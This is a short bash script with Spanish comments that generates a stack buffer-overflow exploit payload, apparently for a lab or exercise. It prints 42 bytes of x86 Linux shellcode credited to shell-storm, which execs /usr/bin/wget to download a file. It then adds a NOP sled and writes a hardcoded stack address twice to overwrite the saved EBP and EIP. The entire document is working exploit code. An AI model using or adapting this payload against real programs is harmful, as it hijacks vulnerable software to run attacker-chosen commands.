#!/bin/bash
#Intenta descargar un archivo 
#http://shell-storm.org/shellcode/files/shellcode-611.php
#42 bytes
echo -ne "\x6a\x0b\x58\x99\x52\x68\x61\x61\x61\x61\x89\xe1\x52\x6a\x74\x68\x2f\x77\x67\x65\x68\x2f\x62\x69\x6e\x68\x2f\x75\x73\x72\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80\x40\xcd\x80"

for i in $(seq 43 508)
do
  echo -en "\x90" 
done

#sobreescribir las copias del ebp y eip
for i in 1 2
do
  echo -en "\xac\xd4\xff\xff"
done
